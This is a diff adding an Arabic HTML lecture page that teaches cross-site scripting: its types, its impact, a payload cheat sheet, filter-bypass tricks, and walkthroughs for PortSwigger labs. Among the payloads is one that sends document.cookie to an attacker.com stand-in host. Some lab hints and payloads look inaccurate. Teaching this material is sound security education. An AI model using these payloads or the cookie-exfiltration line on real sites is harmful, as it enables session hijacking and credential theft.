@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محاضرة Cross-site Scripting (XSS)</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; line-height: 1.6; color: #e8eaed; background: #151b2f; min-height: 100vh; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 48px; padding: 64px 24px; background: linear-gradient(135deg, #1a2125, #203942); border-radius: 12px; box-shadow: 0 4px 24px rgb(33, 48, 70); }
+        .header h1 { font-size: 2.5rem; font-weight: 400; color: #ffffff; margin-bottom: 16px; letter-spacing: -0.5px; }
+        .header .subtitle { font-size: 1.1rem; font-weight: 300; color: rgba(255, 255, 255, 0.9); margin-bottom: 24px; }
+        .lecture-info { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; margin-top: 20px; }
+        .info-item { background: rgba(255, 255, 255, 0.2); padding: 12px 24px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.3); color: #ffffff; font-weight: 500; }
+        .info-item i { color: #ffffff; margin-left: 8px; }
+        .nav-menu { background: #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 32px; border: 1px solid #2d3748; box-shadow: 0 1px 6px rgba(26, 35, 50, 0.4); }
+        .nav-menu h3 { color: #e8eaed; font-size: 1.5rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
+        .nav-menu ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
+        .nav-menu a { display: flex; align-items: center; padding: 12px 16px; color: #e8eaed; text-decoration: none; border-radius: 8px; transition: all 0.2s ease; border: 1px solid transparent; }
+        .nav-menu a:hover { background: #2d3748; border-color: #3b475d; }
+        section { background: #0f1724; border: 1px solid #2b3447; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3); }
+        h2 { color: #ffffff; font-size: 1.6rem; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
+        h3 { color: #a5b4fc; font-size: 1.2rem; margin: 14px 0; }
+        h4 { color: #c7d2fe; font-size: 1.1rem; margin: 12px 0 8px 0; font-weight: 500; }
+        p { color: #c7d2fe; margin-bottom: 12px; line-height: 1.7; }
+        .list { margin: 10px 0 0 0; padding-right: 18px; color: #c7d2fe; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin: 20px 0; }
+        .card { background: #0c1220; border: 1px solid #263148; border-radius: 10px; padding: 18px; }
+        .code-block { 
+            background: #0d1117; 
+            border: 1px solid #30363d; 
+            border-radius: 6px; 
+            padding: 16px; 
+            color: #f0f6fc; 
+            font-family: 'SFMono-Regular', 'Consolas', 'Liberation Mono', 'Menlo', monospace; 
+            overflow-x: auto; 
+            margin: 16px 0; 
+            font-size: 14px; 
+            line-height: 1.45;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            white-space: pre-wrap;
+        }
+        .tip { background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); color: #d1fae5; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .warn { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); color: #fde68a; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .danger { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.25); color: #fecaca; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+        .attack-demo { background: #1a1a2e; border: 1px solid #16213e; border-radius: 10px; padding: 20px; margin: 16px 0; }
+        .attack-demo h4 { color: #ff6b6b; margin-bottom: 12px; }
+        .lab-card { background: linear-gradient(135deg, #1e3a8a, #1e40af); border: 1px solid #3b82f6; border-radius: 12px; padding: 20px; margin: 12px 0; }
+        .lab-card h4 { color: #ffffff; margin-bottom: 8px; }
+        .lab-card p { color: #dbeafe; font-size: 0.95rem; }
+        .lab-link { display: inline-block; background: #3b82f6; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; margin-top: 10px; font-size: 0.9rem; }
+        .lab-link:hover { background: #2563eb; }
+        .mermaid { 
+            background: #1a2332 !important; 
+            border: 1px solid #2d3748; 
+            border-radius: 8px; 
+            padding: 16px; 
+            margin: 16px 0; 
+            color: #e8eaed !important;
+        }
+        
+        /* تأكيد أن جميع عناصر Mermaid تستخدم الألوان الداكنة */
+        .mermaid svg {
+            background: #1a2332 !important;
+        }
+        
+        .mermaid .node rect, .mermaid .node circle, .mermaid .node ellipse, .mermaid .node polygon {
+            fill: #1a2332 !important;
+            stroke: #2d3748 !important;
+            color: #e8eaed !important;
+        }
+        
+        .mermaid .edgeLabel {
+            background-color: #1a2332 !important;
+            color: #e8eaed !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-code"></i> Cross-site Scripting (XSS)</h1>
+            <div class="subtitle">حقن الأكواد الخبيثة في صفحات الويب</div>
+            <div class="lecture-info">
+                <div class="info-item"><i class="fas fa-clock"></i> 1.5 ساعة</div>
+                <div class="info-item"><i class="fas fa-flask"></i> 5 مختبرات</div>
+                <div class="info-item"><i class="fas fa-signal"></i> سهل إلى متوسط</div>
+                <div class="info-item"><i class="fas fa-shield-alt"></i> حماية شاملة</div>
+            </div>
+        </div>
+
+        <div class="nav-menu">
+            <h3>محتويات المحاضرة</h3>
+            <ul>
+                <li><a href="#intro"><i class="fas fa-info-circle"></i> مقدمة</a></li>
+                <li><a href="#xss-types"><i class="fas fa-bug"></i> أنواع XSS</a></li>
+                <li><a href="#xss-impact"><i class="fas fa-skull-crossbones"></i> تأثير XSS</a></li>
+                <li><a href="#xss-vectors"><i class="fas fa-bomb"></i> أشهر Payload (vectors)</a></li>
+                <li><a href="#bypassing-filters"><i class="fas fa-filter"></i> تجاوز الفلاتر</a></li>
+                <li><a href="#labs"><i class="fas fa-flask"></i> مختبرات عملية</a></li>
+                <li><a href="#defense"><i class="fas fa-shield-halved"></i> طرق الحماية</a></li>
+                <li><a href="#summary"><i class="fas fa-list-check"></i> الخلاصة</a></li>
+            </ul>
+        </div>
+
+        <section id="intro">
+            <h2><i class="fas fa-info-circle"></i> مقدمة - ما هو Cross-site Scripting (XSS)؟</h2>
+            
+            <p>مرحباً بكم في محاضرة ثغرات XSS! 🎯</p>
+            
+            <p>تخيل أنك تزور موقعاً إلكترونياً موثوقاً، وفجأة يظهر لك مربع منبثق برسالة غريبة، أو يتم تحويلك لصفحة أخرى، أو يتم سرقة معلوماتك الشخصية. هذا بالضبط ما تفعله ثغرات <strong>Cross-site Scripting (XSS)</strong>!</p>
+
+            <p><strong>XSS</strong> هي واحدة من أقدم وأخطر الثغرات في تطبيقات الويب، ولا تزال ضمن OWASP Top 10. تحدث عندما يقوم المهاجم بحقن كود برمجي (غالباً JavaScript) خبيث في صفحات الويب التي يراها المستخدمون الآخرون. هذا الكود يتم تنفيذه في متصفح الضحية وكأنه جزء أصيل من الموقع الموثوق به.</p>
+            
+            <div class="tip">
+                <h4><i class="fas fa-lightbulb"></i> ما ستتعلمه في هذه المحاضرة</h4>
+                <ul class="list">
+                    <li>🎯 فهم مفهوم XSS من الصفر بأمثلة عملية</li>
+                    <li>🖼️ رسوم توضيحية تشرح كيف تعمل الثغرات بصرياً</li>
+                    <li>⚔️ أنواع XSS الثلاثة (Reflected, Stored, DOM-based)</li>
+                    <li>💥 أشهر payloads المستخدمة في هجمات XSS</li>
+                    <li>🛡️ طرق تجاوز الفلاتر ومكافحة XSS</li>
+                    <li>🧪 5 مختبرات عملية متدرجة الصعوبة من PortSwigger</li>
+                    <li>🔧 أدوات الاختبار والاكتشاف المتقدمة</li>
+                </ul>
+            </div>
+
+            <div class="mermaid">
+graph TD
+    A[المهاجم] --> B[يحقن Script خبيث]
+    B --> C[التطبيق الويب الضعيف]
+    C --> D[المستخدم الضحية يزور الصفحة]
+    D --> E[المتصفح ينفذ Script الخبيث]
+    E --> F[❌ سرقة Cookies, تحويل, تزييف واجهة]
+    style F fill:#ffebee
+            </div>
+
+            <div class="danger">
+                <h4><i class="fas fa-exclamation-triangle"></i> لماذا XSS خطيرة جداً؟</h4>
+                <p>تخيل أن المهاجم يستطيع التحكم بمتصفحك أثناء تصفحك لموقعك البنكي! هذا ما يجعل XSS خطيرة:</p>
+                <ul class="list">
+                    <li><strong>🍪 سرقة ملفات تعريف الارتباط (Cookies):</strong> خاصة cookies الجلسة (Session Cookies)، مما يسمح للمهاجم باختطاف جلسة المستخدم والدخول لحسابه دون كلمة مرور.</li>
+                    <li><strong>🔑 سرقة بيانات الاعتماد:</strong> قراءة إدخالات المستخدم مثل كلمات المرور، أو حتى تزييف حقول الإدخال لسرقتها مباشرة.</li>
+                    <li><strong>🌐 إعادة التوجيه الخبيثة:</strong> توجيه الضحية إلى مواقع تصيد (Phishing sites).</li>
+                    <li><strong>🎨 تزييف واجهة المستخدم (Defacement):</strong> تغيير محتوى الصفحة مرئياً لخداع المستخدمين أو الإضرار بسمعة الموقع.</li>
+                    <li><strong>⬇️ تنزيل برمجيات خبيثة:</strong> إجبار متصفح الضحية على تنزيل ملفات ضارة.</li>
+                    <li><strong>📞 إجراء طلبات HTTP:</strong> تنفيذ طلبات باسم المستخدم إلى الموقع الأصلي (مثل تغيير كلمة المرور، أو إجراء تحويلات بنكية).</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="xss-types">
+            <h2><i class="fas fa-bug"></i> أنواع Cross-site Scripting (XSS)</h2>
+            <p>هناك ثلاثة أنواع رئيسية لثغرات XSS، تختلف في كيفية حقن الكود الخبيث وتخزينه:</p>
+
+            <div class="attack-demo">
+                <h4>✨ 1. Reflected XSS (المنعكسة) - الأكثر شيوعاً</h4>
+                <p>تحدث عندما يتم أخذ إدخال المستخدم من طلب HTTP وإرجاعه فوراً في استجابة الويب بطريقة غير آمنة. لا يتم تخزين الكود الخبيث في الخادم، بل ينعكس مباشرة من الطلب إلى الاستجابة.</p>
+                
+                <div class="mermaid">
+sequenceDiagram
+    participant A as 🥷 المهاجم
+    participant V as 👤 الضحية
+    participant W as 🌐 تطبيق الويب الضعيف
+    
+    A->>A: 1. ينشئ رابطاً خبيثاً
+    Note over A: search.php?query=<script>alert(document.cookie)</script>
+    A->>V: 2. يرسل الرابط للضحية (Phishing)
+    V->>W: 3. الضحية ينقر الرابط
+    W-->>V: 4. التطبيق يعيد Script الخبيث في الاستجابة
+    V->>V: 5. المتصفح ينفذ Script الخبيث 💥
+    V-->>A: 6. معلومات الضحية (Cookies) تُرسل للمهاجم
+                </div>
+                
+                <div class="code-block">
+# مثال: محرك بحث ضعيف
+GET /search.php?query=<script>alert('Reflected XSS!');</script> HTTP/1.1
+Host: vulnerable-site.com
+
+# الاستجابة (غير آمنة):
+<p>You searched for: <script>alert('Reflected XSS!');</script></p>
+                </div>
+                
+                <div class="tip">
+                    <h4>💡 ملاحظات على Reflected XSS</h4>
+                    <ul class="list">
+                        <li><strong>غير مستمرة:</strong> لا يتم تخزين الـ payload في قاعدة البيانات.</li>
+                        <li><strong>تتطلب تفاعل المستخدم:</strong> يجب على الضحية النقر على رابط أو زيارة صفحة معينة.</li>
+                        <li><strong>تُستخدم في حملات التصيد:</strong> تُعد أداة قوية لسرقة الجلسات.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="attack-demo">
+                <h4>💾 2. Stored XSS (المخزّنة/الدائمة) - الأخطر</h4>
+                <p>تحدث عندما يتم تخزين الكود الخبيث بشكل دائم في قاعدة بيانات التطبيق (مثل التعليقات، منشورات المنتديات، ملفات تعريف المستخدمين) ثم يتم استرجاعه وعرضه للمستخدمين الآخرين دون تطهير مناسب.</p>
+                
+                <div class="mermaid">
+sequenceDiagram
+    participant A as 🥷 المهاجم
+    participant W as 🌐 تطبيق الويب الضعيف
+    participant DB as 🗄️ قاعدة البيانات
+    participant V as 👤 الضحية
+    
+    A->>W: 1. يحقن Script خبيث (مثل تعليق)
+    Note over A: <script>alert('Stored XSS!');</script>
+    W->>DB: 2. يخزن التعليق الخبيث
+    DB-->>W: 3. يسترجع التعليق لعرضه
+    W-->>V: 4. الضحية يزور الصفحة التي تحتوي على التعليق
+    V->>V: 5. المتصفح ينفذ Script الخبيث 💥
+    V-->>A: 6. معلومات الضحية (Cookies) تُرسل للمهاجم
+                </div>
+                
+                <div class="code-block">
+# مثال: نظام تعليقات
+POST /submit_comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+comment=Hello!<script>alert(document.cookie)</script>
+
+# عند زيارة صفحة التعليقات:
+<p>Hello!<script>alert(document.cookie)</script></p>
+                </div>
+
+                <div class="danger">
+                    <h4>⚠️ لماذا Stored XSS هي الأخطر؟</h4>
+                    <ul class="list">
+                        <li><strong>تأثير واسع:</strong> بمجرد حقنها، تؤثر على كل من يزور الصفحة المصابة.</li>
+                        <li><strong>لا تتطلب تفاعل:</strong> لا يحتاج المهاجم لإرسال روابط، الضحايا يتأثرون بمجرد تصفح الموقع.</li>
+                        <li><strong>تُستخدم لاستهداف المسؤولين:</strong> يمكن استخدامها لسرقة جلسات مديري المواقع والتحكم بالموقع.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="attack-demo">
+                <h4>💻 3. DOM-based XSS (مبني على الـ DOM) - الأكثر تعقيداً</h4>
+                <p>تحدث عندما يتم حقن الكود الخبيث وتفجيره في متصفح الضحية بسبب تعديلات في نموذج كائن المستند (DOM) من جانب العميل، وليس بسبب إدخال خاطئ في استجابة الخادم. الكود الخبيث لا يمر عبر الخادم.</p>
+                
+                <div class="mermaid">
+sequenceDiagram
+    participant A as 🥷 المهاجم
+    participant V as 👤 الضحية
+    participant B as 🌐 متصفح الضحية
+    
+    A->>A: 1. ينشئ رابطاً خبيثاً
+    Note over A: site.com/page#name=<script>alert(document.cookie)</script>
+    A->>V: 2. يرسل الرابط للضحية
+    V->>B: 3. الضحية يزور الرابط
+    Note over B: المتصفح يقرأ fragment part (#)
+    B->>B: 4. JavaScript في الصفحة يقرأ Fragment<br/>ويضيفه لـ DOM بدون تطهير
+    B->>B: 5. المتصفح ينفذ Script الخبيث 💥
+    B-->>A: 6. معلومات الضحية تُرسل للمهاجم
+                </div>
+                
+                <div class="code-block">
+# مثال: صفحة تقرأ من URL Hash
+// JavaScript في الصفحة
+var user_input = document.location.hash.slice(1); // #name=<script>
+document.getElementById('welcome').innerHTML = "Welcome " + user_input;
+
+# الـ payload في URL:
+https://example.com/page#name=<img onerror=alert(1) src=x>
+
+# الكود الناتج في DOM:
+<div id="welcome">Welcome <img onerror=alert(1) src=x></div>
+# alert(1) سيتم تنفيذه
+                </div>
+                
+                <div class="tip">
+                    <h4>💡 ملاحظات على DOM-based XSS</h4>
+                    <ul class="list">
+                        <li><strong>جانب العميل:</strong> تحدث بالكامل في متصفح الضحية دون تفاعل مع الخادم بعد تحميل الصفحة.</li>
+                        <li><strong>صعب الاكتشاف:</strong> قد لا تظهر في سجلات الخادم، وتتطلب فحص كود JavaScript.</li>
+                        <li><strong>مصدر الـ payload:</strong> يمكن أن يكون من URL fragment، localStorage، أو أي مصدر يقرأه JavaScript.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="xss-impact">
+            <h2><i class="fas fa-skull-crossbones"></i> تأثير Cross-site Scripting (XSS)</h2>
+            <p>تختلف خطورة هجوم XSS بناءً على بيانات المستخدم التي يمكن الوصول إليها والتصرفات التي يمكن للمهاجم القيام بها. التأثيرات يمكن أن تكون مدمرة للمستخدمين وللشركة:</p>
+
+            <div class="grid">
+                <div class="card">
+                    <h3>🍪 سرقة الجلسات (Session Hijacking)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> سرقة ملفات تعريف الارتباط (Cookies) الخاصة بالجلسة.</li>
+                        <li><strong>الآلية:</strong> حقن <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ثم إرسالها للمهاجم.</li>
+                        <li><strong>النتيجة:</strong> المهاجم يستخدم الـ cookie للدخول لحساب الضحية دون الحاجة لكلمة مرور.</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>🔑 سرقة بيانات الاعتماد (Credential Theft)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> خداع المستخدم لإدخال بياناته في صفحة مزيفة.</li>
+                        <li><strong>الآلية:</strong> إنشاء نموذج تسجيل دخول مزيف باستخدام JavaScript وحقنه في الصفحة.</li>
+                        <li><strong>النتيجة:</strong> بيانات الاعتماد (username/password) تُرسل مباشرة للمهاجم.</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>🌐 إعادة التوجيه الخبيثة (Malicious Redirection)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> توجيه الضحية إلى موقع ضار أو موقع تصيد.</li>
+                        <li><strong>الآلية:</strong> استخدام <code>window.location.href = 'https://malicious.com'</code>.</li>
+                        <li><strong>النتيجة:</strong> الضحية يتم توجيهه لموقع يتحكم به المهاجم لسرقة معلومات إضافية أو تنزيل برمجيات خبيثة.</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>🎨 تزييف واجهة المستخدم (Defacement)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> تغيير المحتوى المرئي لصفحة الويب.</li>
+                        <li><strong>الآلية:</strong> التلاعب بـ DOM (مثال: <code>document.body.innerHTML = 'Hacked by...'</code>).</li>
+                        <li><strong>النتيجة:</strong> إلحاق الضرر بسمعة الموقع، نشر رسائل مضللة، أو حتى تعطيل وظائف الموقع.</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>📞 تنفيذ طلبات باسم المستخدم (Making Requests)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> إجبار متصفح الضحية على تنفيذ طلبات HTTP إلى الخادم الأصلي.</li>
+                        <li><strong>الآلية:</strong> استخدام <code>XMLHttpRequest</code> أو <code>fetch</code> API لإرسال طلبات POST/GET.</li>
+                        <li><strong>النتيجة:</strong> تغيير كلمة المرور، حذف حساب، إرسال رسائل، أو إجراء تحويلات مالية باسم الضحية (إذا لم يكن هناك حماية CSRF).</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <h3>🔍 فحص المنافذ الداخلية (Internal Port Scanning)</h3>
+                    <ul class="list">
+                        <li><strong>الهدف:</strong> اكتشاف المنافذ المفتوحة على شبكة الضحية أو شبكة الشركة الداخلية.</li>
+                        <li><strong>الآلية:</strong> محاولة تحميل صور أو موارد من عناوين IP ومنافذ داخلية متعددة وتسجيل الأخطاء أو النجاح.</li>
+                        <li><strong>النتيجة:</strong> رسم خريطة للشبكة الداخلية للمؤسسة واكتشاف خدمات ضعيفة.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="xss-vectors">
+            <h2><i class="fas fa-bomb"></i> أشهر Payload (Vectors) في هجمات XSS</h2>
+            <p>هذه أمثلة على الـ payloads الشائعة التي يستخدمها المهاجمون. الـ payload الفعال يعتمد على السياق الذي يتم فيه حقن الكود:</p>
+
+            <div class="grid">
+                <div class="card">
+                    <h4>الأساسي: استخدام وسم <code>&lt;script&gt;</code></h4>
+                    <div class="code-block">
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;script&gt;prompt(1)&lt;/script&gt;
+&lt;script&gt;confirm(1)&lt;/script&gt;
+&lt;script&gt;location='//attacker.com/cookie.php?c='+document.cookie&lt;/script&gt;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>استخدام سمات الأحداث (Event Attributes)</h4>
+                    <div class="code-block">
+&lt;img src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;&lt;/svg&gt;
+&lt;input type="text" value="" onfocus="alert(1)" autofocus&gt;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>استخدام Pseudo-protocols (مخططات URL)</h4>
+                    <div class="code-block">
+&lt;a href="javascript:alert(1)"&gt;Click Me&lt;/a&gt;
+&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
+&lt;img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"&gt;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>استخدام وسم <code>&lt;iframe&gt;</code></h4>
+                    <div class="code-block">
+&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
+&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
+&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/iframe&gt;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>حقن في تعليقات HTML أو CSS</h4>
+                    <div class="code-block">
+&lt;!--XSS--&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;div style="background-image:url(javascript:alert(1))"&gt;
+&lt;style&gt;@import 'javascript:alert(1)';&lt;/style&gt;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>تجاوز فلاتر المسافات/التعليقات</h4>
+                    <div class="code-block">
+&lt;img/src=x%20onerror=alert(1)&gt;
+&lt;img src=x on<script>alert(1)</script>error=alert(1)&gt;
+&lt;img src=x onerror=/*&lt;svg/onload=alert(1)&gt;*/alert(1)&gt;
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="bypassing-filters">
+            <h2><i class="fas fa-filter"></i> تجاوز الفلاتر و WAFs في XSS</h2>
+            <p>المواقع غالباً ما تستخدم فلاتر لمنع هجمات XSS. المهاجمون يحاولون تجاوز هذه الفلاتر باستخدام تقنيات مختلفة:</p>
+
+            <div class="grid">
+                <div class="card">
+                    <h4>ترميز URL (URL Encoding)</h4>
+                    <p>تشفير الأحرف الخاصة لتجاوز الفلاتر التي تبحث عن سلاسل نصية معينة.</p>
+                    <div class="code-block">
+&lt;script&gt;alert(1)&lt;/script&gt;
+# تصبح:
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+# مثال آخر:
+&lt;img src=x onerror=alert(1)&gt;
+# تصبح:
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>تشفير HTML (HTML Entities)</h4>
+                    <p>استخدام كيانات HTML لتمثيل الأحرف الخاصة.</p>
+                    <div class="code-block">
+&lt;script&gt;alert(1)&lt;/script&gt;
+# تصبح:
+&amp;lt;script&amp;gt;alert&amp;lpar;1&amp;rpar;&amp;lt;/script&amp;gt;
+
+# أو بترميز الأرقام:
+&amp;#x3C;script&amp;#x3E;alert&amp;#x28;1&amp;#x29;&amp;#x3C;/script&amp;#x3E;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>تجاوز فلاتر المسافات والحروف الكبيرة والصغيرة</h4>
+                    <p>بعض الفلاتر حساسة لحالة الأحرف أو تتطلب مسافات معينة.</p>
+                    <div class="code-block">
+&lt;IMG SRC=x ONERROR=alert(1)&gt;
+&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;img/src=x onerror=alert(1)&gt; (استخدام / بدلاً من مسافة)
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>استخدام علامات اقتباس مختلفة</h4>
+                    <p>إذا كان الفلتر يمنع علامة اقتباس واحدة، جرب الأخرى.</p>
+                    <div class="code-block">
+&lt;img src=x onerror="alert(1)"&gt;
+&lt;img src=x onerror='alert(1)'&gt;
+&lt;img src=x onerror=`alert(1)`&gt; (backticks في ES6)
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>تجاوز الكلمات المحظورة (Blacklisting)</h4>
+                    <p>إذا كانت كلمة "script" محظورة، جرب بدائل.</p>
+                    <div class="code-block">
+&lt;img src=x onerror=alert`1`&gt; (استخدام backticks بدلاً من أقواس)
+&lt;img src=x onerror=top['al'+'ert'](1)&gt;
+&lt;img src=x onerror=eval('al'+'ert(1)')&gt;
+&lt;svg/onload=alert(1)&gt;
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h4>حقن في سياق CSS</h4>
+                    <p>إذا كانت إدخالات المستخدم تظهر في كود CSS.</p>
+                    <div class="code-block">
+body { background-image: url("javascript:alert(1)"); }
+@import "javascript:alert(1)";
+&lt;div style="width: expression(alert(1));"&gt; (IE only)
+                    </div>
+                </div>
+            </div>
+
+            <div class="warn">
+                <h4>⚠️ نصيحة مهمة: السياق هو الملك!</h4>
+                <p>فعالية الـ payload تعتمد بشكل كبير على السياق الذي يتم فيه حقن الكود. هل هو داخل وسم HTML؟ داخل سمة؟ داخل JavaScript؟ داخل CSS؟ فهم السياق ضروري لاختيار الـ payload المناسب.</p>
+            </div>
+        </section>
+
+        <section id="labs">
+            <h2><i class="fas fa-flask"></i> مختبرات عملية (5) - PortSwigger Academy</h2>
+            <p>مختبرات متدرجة الصعوبة من PortSwigger Academy لتطبيق ما تعلمته عملياً. كل مختبر يحتوي على خطوات مفصلة ونصائح للحل.</p>
+
+            <h3>✨ مختبرات Reflected XSS</h3>
+            
+            <div class="lab-card">
+                <h4>🧪 Lab 1: Reflected XSS into HTML context with nothing encoded</h4>
+                <p><strong>الهدف:</strong> حقن XSS في سياق HTML دون أي تشفير.</p>
+                <p><strong>التقنية:</strong> استخدام وسم <code>&lt;script&gt;</code> مباشر.</p>
+                <div class="code-block">
+# خطوات الحل:
+1. ابحث عن نقطة إدخال (Input field) تعكس إدخالك.
+2. أدخل Payload: &lt;script&gt;alert(document.domain)&lt;/script&gt;
+3. لاحظ تنفيذ الـ JavaScript في المتصفح.
+                </div>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-with-nothing-encoded" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 2: Reflected XSS into HTML context with most tags and attributes blocked</h4>
+                <p><strong>الهدف:</strong> تجاوز فلتر يحظر معظم الوسوم والسمات.</p>
+                <p><strong>التقنية:</strong> استخدام وسم <code>&lt;img&gt;</code> مع سمة <code>onerror</code>.</p>
+                <div class="code-block">
+# خطوات الحل:
+1. جرب Payload: &lt;script&gt;alert(1)&lt;/script&gt; (سيتم حظره).
+2. جرب Payload: &lt;img src=x onerror=alert(1)&gt;
+3. تأكد من أن الـ payload لا يحتوي على مسافات أو أحرف محظورة.
+                </div>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-with-most-tags-and-attributes-blocked" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <h3>💾 مختبرات Stored XSS</h3>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 3: Stored XSS into HTML context with nothing encoded</h4>
+                <p><strong>الهدف:</strong> حقن XSS دائمة في سياق HTML.</p>
+                <p><strong>التقنية:</strong> حقن <code>&lt;script&gt;</code> في التعليقات أو المنشورات.</p>
+                <div class="code-block">
+# خطوات الحل:
+1. اذهب إلى صفحة التعليقات أو المنتدى.
+2. أضف تعليقاً يحتوي على: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+3. سجل خروجك ثم سجل دخولك مرة أخرى أو اطلب من مستخدم آخر زيارة الصفحة.
+4. لاحظ سرقة الـ cookie.
+                </div>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-with-nothing-encoded" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <h3>💻 مختبرات DOM-based XSS</h3>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 4: DOM XSS in document.write sink using location.search source</h4>
+                <p><strong>الهدف:</strong> استغلال DOM XSS باستخدام <code>document.write</code>.</p>
+                <p><strong>التقنية:</strong> حقن HTML/JavaScript في معلمة URL (query string).</p>
+                <div class="code-block">
+# خطوات الحل:
+1. ابحث عن دالة JavaScript تستخدم <code>location.search</code> أو <code>location.hash</code>.
+2. أضف Payload: <code>?&lt;img src=x onerror=alert(1)&gt;</code> إلى URL.
+3. تأكد من أن الدالة لا تقوم بتطهير الإدخال.
+                </div>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-using-location-search-source" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
+                </a>
+            </div>
+
+            <div class="lab-card">
+                <h4>🧪 Lab 5: DOM XSS in innerHTML sink using location.hash source</h4>
+                <p><strong>الهدف:</strong> استغلال DOM XSS باستخدام <code>innerHTML</code>.</p>
+                <p><strong>التقنية:</strong> حقن HTML/JavaScript في URL fragment.</p>
+                <div class="code-block">
+# خطوات الحل:
+1. ابحث عن دالة JavaScript تستخدم <code>location.hash</code> وتضعها في <code>innerHTML</code>.
+2. أضف Payload: <code>#&lt;img src=x onerror=alert(1)&gt;</code> إلى URL.
+3. المتصفح سينفذ الكود عند تحميل الصفحة.
+                </div>
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink-using-location-hash-source" class="lab-link" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> فتح المختبر
